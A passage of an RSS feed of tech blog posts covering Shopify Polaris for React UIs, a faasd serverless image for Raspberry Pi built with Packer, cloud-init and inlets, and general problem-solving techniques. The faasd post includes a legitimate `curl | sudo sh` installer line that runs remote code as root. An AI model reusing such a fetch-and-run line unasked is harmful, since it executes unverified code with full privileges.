<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>There are a wide range of reactjs tutorials available online but not many of them are optimised for a bootstrapper wanting to hack together a product as soon as possible while not compromising too much on quality. This was the exact problem we faced while building our <a href="https://www.superlemon.xyz/" target="_blank">product</a>.</p><p>As many web developers will tell you, the core business logic is never the bottleneck. What consumes the most amount of time is styling the UI and polishing it to adhere to the UI/UX expectations of 2020 while also being responsive on devices of all shapes and sizes.</p><p>So what if there was a library that takes care of all of these things and allows you to focus solely on your business logic? This is exactly what <a href="https://polaris.shopify.com/" target="_blank">Polaris</a> does.&nbsp; It is a library of react components built by Shopify and they use it for their own UI as well.&nbsp;</p><p>Using Polaris is as simple of piecing a bunch of lego blocks together to build something. Each of these lego blocks are react components which can be customised by simply changing the properties provided to that component. To use Polaris you would need to know the basic concepts of <a href="https://reactjs.org/" target="_blank">reactjs</a>.</p><p>Once this is done, the app is automatically responsive on devices of all shapes and sizes. So what lego blocks do we need to build a web application? Lets go over all the lego blocks that worked really well for us.</p><h4><strong>Building blocks of an application</strong></h4><p><strong>Top bar</strong><br></p><p>A great place to display your product logo on the left and account information on the right. You can customise this further with your own brand colour like we did instead of the default Polaris colour.&nbsp;</p><figure id="w-node-c14165b32a58-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8ff224411f41a98bc1_J6WgI02o788u8fUOOLXGDbWBBCuasfn5k4rDNieIXNhgsyGi2Aqjiro7SzfxuDrITBa3e0aXP4B2Bq4rbTB1x2qK2BT3q1a4NA6AnNTSfoewB_OsEltT_WpoItq5mx83a-WVmMTj.png" alt=""></p><figcaption>Top bar on desktop</figcaption></figure><figure id="w-node-c49c1e6e9c0b-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8ea9fdccbcb8e5b984_FOyIlrhApBiwULD2sos88LHSlY1lwtP2EWQMceK1XbnPFyj8He-K0zZhysyLXOxg_tAz2O2KcPTaxKul1iq2i3OjxmktVFtXa5XxS-agl0l78gWOL-VS-h90kG8Okdh3LybpkBmY.png" alt=""></p><figcaption>Top bar on mobile</figcaption></figure><p><a href="https://polaris.shopify.com/components/structure/top-bar" target="_blank">How it works</a></p><p><strong>Side navigation bar</strong><br></p><p>Use this to display all your features/pages which the user can use to navigate your product. The component gives you a way to add your own icon to each of the navigation items. You can also choose from a whole range of existing icons that polaris already offers using the <a href="https://polaris-icons.shopify.com/" target="_blank">Polaris icon explorer.</a></p><figure><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8f54a6e4ac1c4c21bd_WIsnfOkx8vCjec993mrEW6aGGk95MizQrL7eckReCLRb2kIhxLudwNbs_j7lSVFKPGUeK71i23AK0keYlbarDQX66Xq4UWM0V-c7PIywL2eL7z0xeGz-dAisZY0jSSHDpgCr5f96.png" alt=""></p><figcaption>Side navigation bar on desktop</figcaption></figure><figure><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8ffc7743730c341279_4ueZFh_fly5dsHzUKeucQ7PLjHw8WI6iUThZN1mD3C4DE4zj-9w0di2jGqYFlLPuHMyVlGES-REMagA9REDgknV3Iymj3Ol_Mm3YJEwgOnCFU_7BrgaJqFasjLGpHcE9nSfJCgRl.png" alt=""></p><figcaption>Side navigation bar on mobile</figcaption></figure><p><a href="https://polaris.shopify.com/components/navigation/navigation" target="_blank">How it works</a></p><p><strong>Contextual save bar</strong><br></p><p>Ever find yourself with a UX problem where you have a bunch of settings in a page that the user can configure, but there needs to be a way for the user to save their progress in between?&nbsp;</p><p>The dilemma here is that if you have a save button at the bottom, one would have to scroll till the bottom to discover the button and save and if the button is at the top one would have to scroll back up to save if they are at the bottom of the page.</p><p>Contextual save bar solves this problem by turning the top bar into an interface where you can either save your progress or discard it. This is super neat because the top bar will always be visible no matter where you scroll.</p><figure id="w-node-49d01aa04721-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8f5758780cc209b7af_V-haLuo0KVmYrrd11vGBpkRdDPdxzaCA-f8Y6BF6fOBYnAxyBRRNV684i-c4k7xlzn10Mf_owWGLZcXO7V1hsmHnjKr_zGmquTSeR22VT7SAjFKVmmqRwuiPGQcQADe1kPtwXz01.png" alt=""></p><figcaption>Contextual save bar on desktop</figcaption></figure><figure id="w-node-2162975b1d32-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8e7fefc4c0da22955a_mRM-BS4-ogcoduEfc7AeQkYF0Xv1UUkofasi-hwfMg7q9FNEgTCPlZGoeONQ9T1AIhkfzSCqRANp-XdA1tRY2UuN0Nho0NDAcOpJ78RWtyWDq0V2Jzqsl4uo566hKHR5GftNiSI4.png" alt=""></p><figcaption>Contextual save bar on mobile</figcaption></figure><p><strong>Annotated section</strong><br></p><p>Oftentimes when you use forms to collect information from a user, it is a challenge to educate them about what that form is for. You would either have to give this description before displaying the form or after.</p><p>Annotated section solves this problem by giving you a super simple and elegant way to put the description on the left while displaying the form on the right.</p><figure id="w-node-17b8cb531581-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8f302f5f5b18c538b9_RjAKWUpQfaio8pxDF9fhfW2QFSu8jWE3eh7c4c05iQ-Tboax0U9KsFcAR4m0Shml8U_t0reAlnlivw4VhhlF-iZUjNYC-nqFHqUyRpRNRgicIXnnPpR5c-oIzNF7HUzoQaDkzXUV.png" alt=""></p><figcaption>Annotated section on desktop</figcaption></figure><figure id="w-node-cfef4e415a71-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8f575878ebfd09b7b0_UdWY-kQDlrIL2VDNinW9AT_2kcV8cwO0cX3_Y7-YZrTg8HU6fQKqo1TAKQmUiVmUzwaI-q3VGVYhtpr6UkerOuOKRm7xzJ72H6IBoYCQNo6HmSN-ehr2DyeUM8v7rMjnYumXUg46.png" alt=""></p><figcaption>Annotated section on mobile</figcaption></figure><p><a href="https://polaris.shopify.com/components/structure/layout" target="_blank">How it works</a></p><p><strong>Banner</strong><br></p><p>Displaying banners are a great way to communicate to users about stuff like new features, outages, nudging them to subscribe to paid plans, etc. Polaris provides a wide range of banners which can be customised simply by changing certain properties of the component.&nbsp;</p><figure id="w-node-ea308f6cc919-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8fb1f468d21ce9078d_zYBbjcpN20mWNn9xa3eioOODhodVmg2y77zoTo0UQ1qo38ssoXk6sjvy6ClzZ7OErnqbXhXLJcvWictRLmZeqF4AtkzokKF7I1FZP1fmW0px-a69Z6DyDndZuDGNHRixqQpTbbWr.png" alt=""></p><figcaption>Informational banner</figcaption></figure><p><a href="https://polaris.shopify.com/components/feedback-indicators/banner" target="_blank">How it works</a></p><p><strong>Card</strong><br></p><p>Every interface needs a way to display a certain unit of information. This can be achieved using a card. You can also easily add headers and actionable buttons to the card with just a few tweaks in the properties.&nbsp;</p><figure id="w-node-535bce69f012-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed8fb95a30f95ec3c6e9_JKy4W782W7B1iXIXbLKmNEXHY_YHGQG7yVztqpJNBo1gyuP5I8VPM1EVkfjfx8vx9JtY72WgKjaZ4IQ5HuvdqJpOO9hlommm2U0MFvt73YyaVN_4YZodXWCwaoSKfbtl3djrojYD.png" alt=""></p><figcaption>Card component as a wrapper for a unit of information</figcaption></figure><p><a href="https://polaris.shopify.com/components/structure/card" target="_blank">How it works</a></p><p><strong>Pages</strong><br></p><p>The Page component serves as a container to hold all the other components, all the while providing a title, subtitle and some actionable items that can be taken on that page.&nbsp;</p><figure id="w-node-cc28046d5d3f-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed9079710a875f7d5541_2dE6qhfxu5KZv0KV0FmVmG5p1ZhMVN6vqtd9CJysMNkEDEFnJtMJdgcdRJyCYlrB6-VlDhjn4qi8AmsrwsJxQlD4f70LzZlBLa_MujfSnJPPBo4TuglBETbAIzEylJKmw71d1x_2.png" alt=""></p><figcaption>Page title and actionable items</figcaption></figure><p><a href="https://polaris.shopify.com/components/structure/page" target="_blank">How it works</a></p><h4><strong>Conclusion</strong><br></h4><p>All the above components are the basic building blocks of an application, however Polaris offers a whole range of other components that are super handy in creating all kinds of flows. You can find all of them <a href="https://polaris.shopify.com/components/get-started" target="_blank">here</a>.&nbsp;</p><p>They also have a bunch of design guidelines around the usage of these components. One does not have to adhere to these guidelines but they definitely help because they are something that Shopify uses and it works great for them.</p><h4><strong>What is the catch?</strong><br></h4><p>Polaris was primarily designed for solving various UI/UX problems that occur in the Shopify systems. This does not mean that they are not useful for things that are built outside of Shopify, it just means that there needs to be an overlap between the product you are trying to build and every use case that Shopify encounters.</p><p>It is a great way to bootstrap a product at lightning speed, but the catch is that the components are not very customisable. They are meant to be picked up and used as is with tweaks made only to the properties passed as arguments to the component.</p><p>You might find yourself in a tricky position if you have to implement a component with custom CSS alongside polaris components. But for the most part polaris has default components to cover most cases and there are workarounds for achieving custom CSS.</p><p>An example of the work around is that we wanted to change the default colour of a Polaris primary button to our own brand colour and we did this by overriding that particular css property globally and changing the colour with a&nbsp; <strong>!important</strong> at the end.</p><figure id="w-node-e058c95d6fdf-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f41ed90ac0649063966176b_kDEWmUJlN21aXLtWJH8Eb0vXc8-SlkKBgyNe9c78FSgbFRJfDPSCTDAtQIqttLNMTDuJ2wYyuYMl_P_n9kzekP2YkpTDzoPwjMbNmCXG_DTI-Jo1aTDHOar3J3R1L1dE8-AgQ3lc.png" alt=""></p><figcaption>CSS&nbsp;override for Polaris</figcaption></figure><h4><strong>Closing note</strong><br></h4><p>For someone that is just getting started with reactjs, using a library like this is a great way to focus on core business logic while at the same time learning the concepts of react without spending time on styling your components.&nbsp;</p></div></div>]]>
            </description>
            <link>https://www.sankalpjonna.com/posts/use-polaris-to-rapidly-build-a-reactjs-application</link>
            <guid isPermaLink="false">hacker-news-small-sites-24249967</guid>
            <pubDate>Sun, 23 Aug 2020 06:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A serverless appliance for your Raspberry Pi with faasd]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24249858">thread link</a>) | @jsiebens
<br/>
August 22, 2020 | https://johansiebens.dev/posts/2020/08/a-serverless-appliance-for-your-raspberry-pi-with-faasd/ | <a href="https://web.archive.org/web/*/https://johansiebens.dev/posts/2020/08/a-serverless-appliance-for-your-raspberry-pi-with-faasd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<figure>
    <img src="https://johansiebens.dev/uploads/luca-bravo-XJXWbfSo2f0-unsplash.jpg"> 
</figure>


<h2 id="intro">Intro</h2>

<p>Serverless computing is not a new concept anymore. It is already quite known and nowadays getting more and more traction as all major cloud providers offer some serverless compute runtime, sometimes also referred to as a Function-as-a-Service (FaaS). AWS Lambda, Google Cloud Run and Azure Functions are some popular implementations.</p>

<figure><a href="https://www.openfaas.com/">
    <img src="https://johansiebens.dev/uploads/OpenFaaS_10_31_2.5_png.png" width="200"> </a>
</figure>


<p>Also in the Open Source community are some very popular implementations available, like <a href="https://www.openfaas.com/" target="_blank">OpenFaas</a>. It allows you to build your Function-as-a-Service platform on top of Docker Swarm or Kubernetes, avoiding vendor lock-in. One of the unique selling points of OpenFaas is maybe its <a href="https://docs.openfaas.com/architecture/faas-provider/" target="_blank"><code>faas-provider</code></a> interface. It makes the platform open for extension by allowing to add other runtimes like HashiCorp Nomad, AWS Fargate, …</p>

<p>The official providers are targeted towards Docker Swarm and Kubernetes, but there is a little sibling in the family of implementations, named <a href="https://github.com/openfaas/faasd" target="_blank">faasd</a>. “Little” in a sense that it is more lightweight, not because it has less features or is less powerful.</p>

<p>faasd is a single binary, but uses the same core components and ecosystem of OpenFaaS. Under the hood it uses <a href="https://containerd.io/" target="_blank">containerd</a>, which makes it ideal for a building a serverless home lab that doesn’t require much computing resources. Like a Raspberry Pi.</p>

<h2 id="installing-faasd-on-a-raspberry-pi">Installing faasd on a Raspberry Pi</h2>

<p>To go from zero to a working faasd on a Raspberry Pi, it does takes some steps to follow. The installation of this lightweight serverless platform is already explained thoroughly by many others, like <a href="https://blog.alexellis.io/faasd-for-lightweight-serverless/" target="_blank">Alex Ellis</a> and <a href="https://myedes.io/serverless-on-raspberrypi/" target="_blank">Mehdi Yedes</a>, so I’m not going into detail here. In a nutshell, it comes down to this:</p>

<ul>
<li>download a Raspios (previously known as Raspbian) image and</li>
<li>flash to an SD card</li>
<li>boot a Raspberry Pi with the SD card</li>
<li>ssh into the Raspberry Pi</li>
<li>install dependencies

<ul>
<li>containerd (not available for arm out-of-the-box)</li>
<li>CNI plugins</li>
</ul></li>
<li>setup container networking</li>
<li>install faasd</li>
</ul>

<p>Now, those steps are not that hard to follow, and with some bash scripts or tools like Ansible, you can execute them in an automated way. But even with some automation, you still have to flash the image, boot the Raspberry Pi, find it’s IP address, … before you can start with the installation, automated or not.</p>

<p>In a virtual environment, like a public cloud provider, this is sometimes solved by baking an image with all required software pre-installed. When administrators create a new instance with such an image instead of a base OS image, the time between starting the machine and a working service ready to process request will be less, because no additional software will be installed during boot. This technique is known as <em>Immutable Infrastructure</em>, which allows you to scale up to meet demand in a fast and provable manner as possible.</p>

<p>What if we could build an image for a Raspberry Pi with faasd and all its dependencies already installed?</p>

<h2 id="building-an-appliance-with-packer">Building an appliance with Packer</h2>

<p>One of the most popular tools for creating machine images is <a href="https://packer.io/" target="_blank">Packer</a> from HashiCorp:</p>

<blockquote>
<p><em>Packer is an open source tool for creating identical machine images for multiple platforms from a single source configuration. Packer is lightweight, runs on every major operating system, and is highly performant, creating machine images for multiple platforms in parallel.</em></p>
</blockquote>

<p>The most obvious use case of Packer is building images for a virtual environment, such as AWS, GCP, VMware, Virtualbox, … and comes with many builders for various platforms by default. But luckily for us, one could easily extend Packer by adding custom builders. One of those custom builders is the <a href="https://github.com/solo-io/packer-builder-arm-image" target="_blank">packer-builder-arm-image</a> created by solo.io, and guess what, it is for building custom arm images, especially for the Raspberry Pi.</p>

<p>Perfect! Exactly what I needed.</p>

<p>I grabbed all the bash scripts I was using before, put them in a Packer template, and started baking the new image with faasd and the dependencies.</p>
<div><pre><code data-lang="yaml">{
  <span>"variables"</span>: {
    <span>"faasd_version"</span>: <span>"0.8.2"</span>
  },
  <span>"builders"</span>: [
    {
      <span>"type"</span>: <span>"arm-image"</span>,
      <span>"iso_url"</span>: <span>"https://downloads.raspberrypi.org/raspbian_lite/images/raspbian_lite-2020-02-07/2020-02-05-raspbian-buster-lite.zip"</span>,
      <span>"iso_checksum"</span>: <span>"7ed5a6c1b00a2a2ab5716ffa51354547bb1b5a6d5bcb8c996b239f9ecd25292b"</span>,
      <span>"iso_checksum_type"</span>: <span>"sha256"</span>
    }
  ],
  <span>"provisioners"</span>: [
    {
      <span>"type"</span>: <span>"shell"</span>,
      <span>"environment_vars"</span>: [
        <span>"FAASD_VERSION={{user `faasd_version`}}"</span>
      ],
      <span>"scripts"</span>: [
        <span>"scripts/install-cloud-init.sh"</span>,
        <span>"scripts/install-faasd.sh"</span>
      ]
    }
  ]
}</code></pre></div>
<p>The Packer build will take some time, but as soon as it was finished, I flashed my custom image to an SD card and booted a Raspberry Pi. As expected, a few moments later, faasd was available and ready to deploy some functions.</p>

<p>Great, now I have an image I can reuse every time I want to create a new Raspberry Pi.</p>

<p>But wait… What about the OpenFaas credentials that get created when installing faasd? Aren’t they part of the image as well? It seems like the image isn’t that reusable after all.</p>

<p>Not only the OpenFaas credentials should be customizable, but maybe other users would also like to configure authorized ssh keys, or a unique hostname (because Raspbian has by default raspberry as hostname) or a static IP address, or maybe wifi configuration, etc. It was clear to me: to make the image reusable for anyone; I needed to find a way to easily customize the image after flashing it to an SD card.</p>

<p><strong>Configure the SD card with cloud-init</strong></p>

<p>In a <a href="https://johansiebens.dev/posts/2020/08/building-a-nomad-cluster-on-raspberry-pi-running-ubuntu-server/" target="_blank">previous blog post</a>, I already mentioned the use of cloud-init to configure a Raspberry Pi. Unfortunately, cloud-init is not installed by default on Raspbian, but is available as a package in the apt repository. After adding the installation in the Packer template and running the Packer build, this is the new workflow to go from zero to faasd:</p>

<ul>
<li>get the image</li>
<li>flash to SD card</li>
<li>edit user-data</li>
<li>boot Raspberry Pi</li>
</ul>

<p>Eureka! An image with faasd that anyone can use without a hassle!</p>

<h2 id="exposing-the-private-faasd-with-tls">Exposing the private faasd with TLS</h2>

<p>Ok, so now that we have that image, it is quite easy to start a new private faasd instance. Having a private faasd installation is great, but what if you have some functions that you want to expose to the outside world, like a webhook receiver?</p>

<p>Let’s add <a href="https://inlets.dev/" target="_blank">inlets</a>, a cloud native tunnel that allows you to expose private endpoints to the Internet, to our little stack. inlets PRO will use TLS to provide link-level encryption to prevent snooping on tunnel traffic. Besides inlets, we also add <a href="https://caddyserver.com/" target="_blank">Caddy</a> to obtain a certificate, via Let’s Encrypt, for OpenFaas by tunneling out port 80 and 443 instead of the plaintext HTTP port 8080.</p>
<div><pre><code data-lang="bash"><span>#!/bin/bash
</span><span></span>set -e

ARCH<span>=</span><span>$(</span>uname -m<span>)</span>
<span>case</span> $ARCH in
    arm64<span>)</span>
        SUFFIX<span>=</span>arm64
        ;;
    aarch64<span>)</span>
        SUFFIX<span>=</span>arm64
        ;;
    arm*<span>)</span>
        SUFFIX<span>=</span>armhf
        ;;
    *<span>)</span>
        echo <span>"Unsupported architecture </span>$ARCH<span>"</span>
        exit <span>1</span>
<span>esac</span>

echo <span>"=&gt; Downloading and installing inlets pro </span><span>${</span>INLETS_PRO_VERSION<span>}</span><span> </span><span>${</span>SUFFIX<span>}</span><span>"</span>

curl -SLfs <span>"https://github.com/inlets/inlets-pro/releases/download/</span><span>${</span>INLETS_PRO_VERSION<span>}</span><span>/inlets-pro-</span><span>${</span>SUFFIX<span>}</span><span>"</span> <span>\
</span><span></span>    --output <span>"/usr/local/bin/inlets-pro"</span> <span>\
</span><span></span>    <span>&amp;&amp;</span> chmod a+x <span>"/usr/local/bin/inlets-pro"</span>

cat - &gt; /etc/systemd/system/inlets.service <span>&lt;&lt;'EOF'
</span><span>[Unit]
</span><span>Description=Inlets PRO
</span><span>After=caddy.service
</span><span>
</span><span>[Service]
</span><span>EnvironmentFile=/etc/default/inlets-pro
</span><span>ExecStart=/usr/local/bin/inlets-pro client --connect ${INLETS_CONNECT} --token ${INLETS_TOKEN} --license ${INLETS_LICENSE} --tcp-ports 80,443
</span><span>Type=simple
</span><span>Restart=always
</span><span>RestartSec=5
</span><span>StartLimitInterval=0
</span><span>
</span><span>[Install]
</span><span>WantedBy=multi-user.target
</span><span>EOF</span>

systemctl enable inlets</code></pre></div>
<p>In the end, we have an image with:</p>

<ul>
<li>cloud-init</li>
<li>faasd</li>
<li>Caddy</li>
<li>inlets PRO</li>
</ul>

<p><strong>How to use the image</strong></p>

<p>To expose the faasd gateway running on a Raspberry Pi with inlets, you need to create an exit-node with a public IP. I find the use of <a href="https://github.com/inlets/inletsctl" target="_blank">inletsctl</a> the easiest way to achieve this. Download the latest release or install it by running <code>curl -sSLf "https://inletsctl.inlets.dev" | sudo sh</code></p>

<p>Next, create an exit-node on your favourite cloud provider, e.g. on DigitalOcean:</p>
<div><pre><code data-lang="bash">inletsctl create <span>\
</span><span></span>  --provider digitalocean <span>\
</span><span></span>  --access-token-file <span>\~</span>/access-token.txt <span>\
</span><span></span>  --region lon1 <span>\
</span><span></span>  --remote-tcp <span>127</span>.0.0.1</code></pre></div>
<p>The last flag, <code>--remote-tcp</code>, tells the inlets pro client where to send traffic, which in this case will be the loopback-interface. The inlets pro client is configured to punch out ports 80 and 443 out of the tunnel.</p>

<p>One thing left to do: get a domain ready for your faasd installation. Once you have a domain, required for Caddy to generate some TLS certificates with Let’s Encrypt, add a DNS A record with the public IP of the exit-node.</p>

<p>The final steps are, in fact, the same as before:</p>

<ul>
<li>get the custom image (cloud-init + faasd + caddy + inlets pro)</li>
<li>flash to SD card</li>
<li>edit user-data (OpenFaas credentials, inlets token, …)</li>
<li>boot Raspberry Pi</li>
</ul>
<div><pre><code data-lang="yaml"><span>#cloud-config</span>

<span># Set your hostname here, the manage_etc_hosts will update the hosts file entries as well</span>
hostname: faasd
manage_etc_hosts: <span>true</span>

<span># Add an authorized ssh key</span>
ssh_authorized_keys:
  - ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfkByGmwRUjUINP5pYu17yvX2qSdlgeaqlW5MrfsQqdj5WgWnddIPLnH8vFDA376JI3HpzkmZ99VdIJIseBDzv2WzRIE1KnmpzJkHAjY2t/pkxeTXxyBVjTMxg7+PR9Uc+05KcU2TdPAyTDradIsnk5+kPZenE9O3ZK85hEEXVWzbnQCxx4iaTWpXz+ufQ1pmueZDC1GfI+hRyMzALpPj6rkUh0rVsRYLtfDjtmh62dfm20wwZKY/eD4sMcXVsH2bJT1k9fPDQ62pYb7s7uQQTXV38RpkiEfPfhTTxOpLz9LMmovZ91I3ohkLaCFpNhQubEbrNnM2EhNDkdIsObxYH faasd-rpi

write_files:
<span># Configure faasd basic auth user and password</span>
- path: /var/lib/faasd/secrets/basic-auth-user
  content: faasd-admin
- path: /var/lib/faasd/secrets/basic-auth-password
  content: <span>"++01=health=MISS=system=53++"</span>
<span># Configure inlets pro  </span>
- path: /etc/default/inlets-pro
  content: <span>|
</span><span>    INLETS_DOMAIN=&lt;your domain for faasd&gt;</span>
    INLETS_CONNECT=&lt;your inlets pro remote, e.g. wss://<span>243.15</span>.<span>53.46</span>:<span>8123</span>/connect<span>&gt;
</span><span>    INLETS_TOKEN=&lt;your inlets token&gt;</span>
    INLETS_LICENSE=&lt;your inlets pro license&gt;</code></pre></div>
<p>And enjoy your private faasd instance with a public endpoint!</p>

<figure>
    <img src="https://johansiebens.dev/uploads/openfaas-interface.png" alt="OpenFaas ready to go"> <figcaption>
            <p>OpenFaas ready to go</p>
        </figcaption>
</figure>


<h2 id="conclusion">Conclusion</h2>

<p>With …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://johansiebens.dev/posts/2020/08/a-serverless-appliance-for-your-raspberry-pi-with-faasd/">https://johansiebens.dev/posts/2020/08/a-serverless-appliance-for-your-raspberry-pi-with-faasd/</a></em></p>]]>
            </description>
            <link>https://johansiebens.dev/posts/2020/08/a-serverless-appliance-for-your-raspberry-pi-with-faasd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24249858</guid>
            <pubDate>Sun, 23 Aug 2020 05:50:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scaling Postgres for time series data using partitioning, Django and Architect]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24249459">thread link</a>) | @xialingxiao
<br/>
August 22, 2020 | https://www.notion.so/portcast/Scaling-Postgres-for-time-series-data-using-table-partitioning-Django-and-Architect-aa75330e2f744507b4fb9c468f313137 | <a href="https://web.archive.org/web/*/https://www.notion.so/portcast/Scaling-Postgres-for-time-series-data-using-table-partitioning-Django-and-Architect-aa75330e2f744507b4fb9c468f313137">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/portcast/Scaling-Postgres-for-time-series-data-using-table-partitioning-Django-and-Architect-aa75330e2f744507b4fb9c468f313137</link>
            <guid isPermaLink="false">hacker-news-small-sites-24249459</guid>
            <pubDate>Sun, 23 Aug 2020 04:12:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Problem-Solving Techniques That Work for All Types of Challenges (2017)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24249449">thread link</a>) | @wyclif
<br/>
August 22, 2020 | https://www.spencergreenberg.com/2017/06/1514/ | <a href="https://web.archive.org/web/*/https://www.spencergreenberg.com/2017/06/1514/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>A lot of people don’t realize that there are general purpose problem solving techniques that cut across domains. They can help you deal with thorny challenges in work, your personal life, startups, or even if you’re trying to prove a new theorem in math.</p>



<p>Below are the 26 general purpose problem solving techniques that I like best, along with a one-word name I picked for each, and hypothetical examples to illustrate what sort of strategy I’m referring to.</p>



<p>Consider opening up this list whenever you’re stuck solving a challenging problem. It’s likely that one or more of these techniques can help!</p>



<h4>General Purpose Techniques for Solving Challenging Problems of All Kinds</h4>



<p>1. <strong>Clarifying</strong> – try to define the problem you are facing as precisely as you can, maybe by writing down a detailed description of exactly what the problem is and what constraints exist for a solution, or by describing it in detail to another person, which may lead to you realizing the problem is not quite what you had thought, or that it has a more obvious solution than you thought.</p>



<p>Life Example: <em>“I thought that I needed to find a new job, but when I thought really carefully about what I don’t like about my current job, I realized that I could likely fix those things by talking to my boss or even, potentially, just by thinking about them differently.”</em></p>



<p>Startup Example: <em>“we thought we had a problem with users not wanting to sign up for the product, but when we carefully investigated what the problem really was, we discovered it was actually more of a problem of users wanting the product but then growing frustrated because of bad interface design.”</em></p>



<p>2. <strong>Subdividing</strong> – break the problem down into smaller problems in such a way that if you solve each of the small problems, you will have solved the entire problem.</p>



<p>Startup Example:<em> “My goal is to get company Z to become a partner with my company, and that seems hard, so let me break that goal into the steps of (a) listing the ways that company Z would benefit from becoming a partner with us, (b) finding an employee at company Z who would be responsive to hearing about these benefits, and (c) tracking down someone who can introduce me to that employee.”</em></p>



<p>Math Example:<em> “I want to prove that a certain property applies to all functions of a specific type, so I start by (a) showing that every function of that type can be written as a sum of a more specific type of function, then I show that (b) the property applies to each function of the more specific type, and finally I show that (c) if the property applies to each function in a set of functions then it applies to arbitrary sums of those functions as well.”</em></p>



<p>3. <strong>Simplifying </strong>– think of the simplest variation of the problem that you expect you can solve that shares important features in common with your problem, and see if solving this simpler problem gives you ideas for how to solve the more difficult version.</p>



<p>Startup Example: <em>“I don’t know how to hire a CTO, but I do know how to hire a software engineer because I’ve done it many times, and good CTOs will often themselves be good software engineers, so how can I tweak my software engineer hiring to make it appropriate for hiring a CTO?”</em></p>



<p>Math Example: <em>“I don’t know how to calculate this integral as it is, but if I remove one of the free parameters, I actually do know how to calculate it, and maybe doing that calculation will give me insight into the solution of the more complex integral.”</em></p>



<p>4. <strong>Crowd-sourcing</strong> – use suggestions from multiple people to gain insight into how to solve the problem, for instance by posting on Facebook or Twitter requesting people’s help, or by posting to a Q&amp;A site like Quora, or by sending emails to 10 people you know explaining the problem and requesting assistance.</p>



<p>Business Example: <em>“Do you have experience outsourcing manufacturing to China? If so, I’d appreciate hearing your thoughts about how to approach choosing a vendor.”</em></p>



<p>Health Example: <em>“I have trouble getting myself to stick to doing exercise daily. If you also used to have trouble getting yourself to exercise but don’t anymore, I’d love to know what worked to make it easier for you.”</em></p>



<p>5. <strong>Splintering</strong> – if the problem you are trying to solve has special cases that a solution to the general problem would also apply to, consider just one or two of these special cases as examples and solve the problem just for those cases first. Then see if a solution to one of those special cases helps you solve the problem in general.</p>



<p>Startup Example: <em>“I want to figure out how to improve employee retention in general, let me examine how I could have improved retention in the case of the last three people that quit.”</em></p>



<p>Startup Example: <em>“I want to figure out how to convince a large number of people to become customers, let me first figure out how to convince just Bill and John to become customers since they seem like the sort of customer I want to attract, and see what general lessons I learn from doing that.”</em></p>



<p>6. <strong>Reading</strong> – read the books or textbooks that seems most related to the topic, and see whether they provide a solution to the problem, or teach you enough related information that you can now solve it yourself. </p>



<p>Economics Example: <em>“Economists probably have already figured out reasonable ways to estimate demand elasticity, let’s see what an econometrics textbook says rather than trying to invent a technique from scratch.”</em></p>



<p>Mental Health Example: <em>“I’ve been feeling depressed for a long time, maybe I should read some well-liked books about depression, such as ‘Feeling Good.'”</em></p>



<p>7. <strong>Searching </strong>– think of a similar problem that you think practitioners, bloggers or academics might have already solved and search online (e.g., via google, Q&amp;A sites, or google scholar academic paper search) to see if anyone has done a write-up about how they solved it.</p>



<p>Advertising Example: <em>“I’m having trouble figuring out the right advertising keywords to bid on for my specific product, I bet someone has a blog post describing how to approach choosing keywords for other related products.”</em></p>



<p>Machine Learning Example:<em> “I can’t get this neural network to train properly in my specific case, I wonder if someone has written a tutorial about how to apply neural networks to related problems.”</em></p>



<p>8. <strong>Unconstraining</strong> – list all the constraints of the problem, then temporarily ignore one or more of the constraints that make the problem especially hard, and try to solve it without those constraints. If you can, then see if you can modify that unconstrained solution until it becomes a solution for the fully constrained problem.</p>



<p>Startup Example: <em>“I need to hire someone who can do work at the intersection of machine learning and cryptography, let me drop the constraint of having cryptography experience and recruit machine learning people, then pick from among them a person that seems both generally capable and well positioned to learn the necessary cryptography.”</em></p>



<p>Computer Science Example: <em>“I need to implement a certain algorithm, and it needs to be efficient, but that seems very difficult, so let me first figure out how to implement an inefficient version of the algorithm (i.e., drop the efficiency constraint), then at the end I will try to figure out how to optimize that algorithm for efficiency.”</em></p>



<p>9. <strong>Distracting</strong> – fill your mind with everything you know about the problem, including facts, constraints, challenges, considerations, etc. and then stop thinking about the problem, and go and do a relaxing activity that requires little focus, such as walking, swimming, cooking, napping or taking a bath to see if new ideas or potential solutions pop into your mind unexpectedly as your subconscious continues to work on the problem without your attention.</p>



<p>Example: <em>“For three days, I’ve been trying to solve this problem at work, but the solution only came to me when I was strolling in the woods and not even thinking about it.”</em></p>



